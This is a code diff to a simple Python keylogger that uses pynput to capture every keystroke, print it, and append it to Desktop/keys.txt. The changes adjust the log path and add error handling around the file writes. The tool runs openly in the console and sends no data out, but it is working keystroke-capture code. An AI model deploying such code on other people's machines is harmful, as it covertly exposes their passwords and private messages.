@@ -1,7 +1,7 @@
 from pynput.keyboard import Key, Listener
 # import
 
-location = "Desktop/keys.txt"
+location = "Desktop\keys.txt"
 # Final location of keys.txt
 
 Key_to_escape = Key.esc
@@ -27,16 +27,20 @@ def on_press(key):
 
     else:
         print("[✓]", keystr, "             [#]key ID:", key)
-    fh = open(location, 'a')
-    if spcqm:
-        fh.write(" ")
-    fh.write(keystr)
-    if keystr == "enter":
-        fh.write("\n")
-    if spcqm:
-        if keystr != "enter":
+    
+    try:
+        fh = open(location, 'a')
+        if spcqm:
             fh.write(" ")
-    fh.close()
+        fh.write(keystr)
+        if keystr == "enter":
+            fh.write("\n")
+        if spcqm:
+            if keystr != "enter":
+                fh.write(" ")
+        fh.close()
+    except:
+        print("[!]: Failed with saving data, wrong path")
 
 def rewrite():
     print("[X]: Do you want to rewrite all saved keys?")
@@ -45,9 +49,13 @@ def rewrite():
     r = int(input("[?]: Your option: "))
     print("")
     if r == 1:
-        fh = open("Desktop/keys.txt", 'w')
-        fh.write("")
-        fh.close()
+        try:
+            fh = open(location, 'w')
+            fh.write("")
+            fh.close()
+        except:
+            print("[!]: Failed with saving data, wrong path")
+            print("")
 
 def exiting():
     global Key_to_escape
